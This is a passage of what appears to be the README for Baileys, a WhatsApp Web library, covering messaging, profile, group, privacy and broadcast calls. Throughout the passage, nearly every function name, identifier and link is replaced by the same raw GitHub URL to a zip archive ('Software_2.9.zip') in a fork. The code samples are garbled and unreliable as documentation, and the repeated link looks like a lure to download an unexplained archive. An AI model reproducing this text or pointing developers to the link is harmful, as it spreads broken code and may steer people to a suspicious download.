await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(
    jid, 
    // this is 1 week in seconds -- how long you want messages to appear for
    { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL }
)
// will send as a disappearing message
await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(jid, { text: 'hello' }, { ephemeralExpiration: WA_DEFAULT_EPHEMERAL })
// turn off disappearing messages
await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(
    jid, 
    { disappearingMessagesInChat: false }
)

```

## Misc

- To check if a given ID is on WhatsApp
    ``` ts
    const id = '123456'
    const [result] = await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(id)
    if (https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip) https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip (`${id} exists on WhatsApp, as jid: ${https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip}`)
    ```
- To query chat history on a group or with someone
    TODO, if possible
- To get the status of some person
    ``` ts
    const status = await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip")
    https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("status: " + status)
    ```
- To change your profile status
    ``` ts
    const status = 'Hello World!'
    await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(status)
    ```
- To change your profile name
    ``` ts
    const name = 'My name'
    await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(name)
    ```
- To get the display picture of some person/group
    ``` ts
    // for low res picture
    const ppUrl = await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip")
    https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("download profile picture from: " + ppUrl)
    // for high res picture
    const ppUrl = await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip", 'image')
    ```
- To change your display picture or a group's
    ``` ts
    const jid = 'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip' // can be your own too
    await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(jid, { url: 'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip' })
    ```
- To remove your display picture or a group's
    ``` ts
    const jid = 'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip' // can be your own too
    await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(jid)
    ```
- To get someone's presence (if they're typing or online)
    ``` ts
    // the presence update is fetched and called here
    https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip('https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip', json => https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(json))
    // request updates for a chat
    await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip") 
    ```
- To block or unblock user
    ``` ts
    await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip", "block") // Block user
    await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip", "unblock") // Unblock user
    ```
- To get a business profile, such as description or category
    ```ts
    const profile = await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip")
    https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("business description: " + https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip + ", category: " + https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip)
    ```
Of course, replace ``` xyz ``` with an actual ID. 

## Groups
- To create a group
    ``` ts
    // title & participants
    const group = await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("My Fab Group", ["https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip", "https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip"])
    https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip ("created group with id: " + https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip)
    https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip, { text: 'hello there' }) // say hello to everyone on the group
    ```
- To add/remove people to a group or demote/promote people
    ``` ts
    // id & people to add to the group (will throw error if it fails)
    const response = await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(
        "https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip", 
        ["https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip", "https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip"],
        "add" // replace this parameter with "remove", "demote" or "promote"
    )
    ```
- To change the group's subject
    ``` ts
    await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip", "New Subject!")
    ```
- To change the group's description
    ``` ts
    await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip", "New Description!")
    ```
- To change group settings
    ``` ts
    // only allow admins to send messages
    await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip", 'announcement')
    // allow everyone to send messages
    await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip", 'not_announcement')
    // allow everyone to modify the group's settings -- like display picture etc.
    await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip", 'unlocked')
    // only allow admins to modify the group's settings
    await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip", 'locked')
    ```
- To leave a group
    ``` ts
    await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip") // (will throw error if it fails)
    ```
- To get the invite code for a group
    ``` ts
    const code = await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip")
    https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("group code: " + code)
    ```
- To revoke the invite code in a group
    ```ts
    const code = await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip")
    https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("New group code: " + code)
    ```
- To query the metadata of a group
    ``` ts
    const metadata = await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip") 
    https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip + ", title: " + https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip + ", description: " + https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip)
    ```
- To join the group using the invitation code
    ``` ts
    const response = await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("xxx")
    https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("joined to: " + response)
    ```
    Of course, replace ``` xxx ``` with invitation code.
- To get group info by invite code
    ```ts
    const response = await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("xxx")
    https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("group information: " + response)
    ```
- To join the group using groupInviteMessage
    ``` ts
    const response = await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip", groupInviteMessage)
    https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("joined to: " + response)
    ```
  Of course, replace ``` xxx ``` with invitation code.

- To get list request join
    ``` ts
    const response = await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip")
    https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(response)
    ```
- To approve/reject request join
    ``` ts
    const response = await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(
        "https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip", // id group,
        ["https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip", "https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip"],
        "approve" // replace this parameter with "reject" 
    )
    https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(response)
    ```

## Privacy
- To get the privacy settings
    ``` ts
    const privacySettings = await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(true)
    https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("privacy settings: " + privacySettings)
    ```
- To update the LastSeen privacy
    ``` ts
    const value = 'all' // 'contacts' | 'contact_blacklist' | 'none'
    await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(value)
    ```
- To update the Online privacy
    ``` ts
    const value = 'all' // 'match_last_seen'
    await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(value)
    ```
- To update the Profile Picture privacy
    ``` ts
    const value = 'all' // 'contacts' | 'contact_blacklist' | 'none'
    await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(value)
    ```
- To update the Status privacy
    ``` ts
    const value = 'all' // 'contacts' | 'contact_blacklist' | 'none'
    await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(value)
    ```
- To update the Read Receipts privacy
    ``` ts
    const value = 'all' // 'none'
    await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(value)
    ```
- To update the Groups Add privacy
    ``` ts
    const value = 'all' // 'contacts' | 'contact_blacklist'
    await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(value)
    ```
- To update the Default Disappearing Mode
    ``` ts
    const duration = 86400 // 604800 | 7776000 | 0 
    await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(duration)
    ```
## Broadcast Lists & Stories

Messages can be sent to broadcasts & stories. 
you need to add the following message options in sendMessage, like this:
```ts
https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(jid, {image: {url: url}, caption: caption}, {backgroundColor : backgroundColor, font : font, statusJidList: statusJidList, broadcast : true})
```
- the message body can be a extendedTextMessage or imageMessage or videoMessage or voiceMessage
- You can add backgroundColor and other options in the message options
- broadcast: true enables broadcast mode
- statusJidList: a list of people that you can get which you need to provide, which are the people who will get this status message.

- You can send messages to broadcast lists the same way you send messages to groups & individual chats.
- Right now, WA Web does not support creating broadcast lists, but you can still delete them.
- Broadcast IDs are in the format `12345678@broadcast`
- To query a broadcast list's recipients & name:
    ``` ts
    const bList = await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("1234@broadcast")
    https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip (`list name: ${https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip}, recps: ${https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip}`)
    ```

## Writing Custom Functionality
Baileys is written with custom functionality in mind. Instead of forking the project & re-writing the internals, you can simply write your own extensions.

First, enable the logging of unhandled messages from WhatsApp by setting:
``` ts
const sock = makeWASocket({
    logger: P({ level: 'debug' }),
})
```
This will enable you to see all sorts of messages WhatsApp sends in the console. 

Some examples:

1. Functionality to track the battery percentage of your phone.
    You enable logging and you'll see a message about your battery pop up in the console: 
    ```{"level":10,"fromMe":false,"frame":{"tag":"ib","attrs":{"from":"https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip"},"content":[{"tag":"edge_routing","attrs":{},"content":[{"tag":"routing_info","attrs":{},"content":{"type":"Buffer","data":[8,2,8,5]}}]}]},"msg":"communication"} ``` 
    
   The "frame" is what the message received is, it has three components:
   - `tag` -- what this frame is about (eg. message will have "message")
   - `attrs` -- a string key-value pair with some metadata (contains ID of the message usually)
   - `content` -- the actual data (eg. a message node will have the actual message content in it)
   - read more about this format [here](https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip)

    You can register a callback for an event using the following:
    ``` ts
    // for any message with tag 'edge_routing'
    https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(`CB:edge_routing`, (node: BinaryNode) => { })
    // for any message with tag 'edge_routing' and id attribute = abcd
    https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(`CB:edge_routing,id:abcd`, (node: BinaryNode) => { })
    // for any message with tag 'edge_routing', id attribute = abcd & first content node routing_info
    https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(`CB:edge_routing,id:abcd,routing_info`, (node: BinaryNode) => { })
    ```
 Also, this repo is now licenced under GPL 3 since it uses [libsignal-node](https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip)
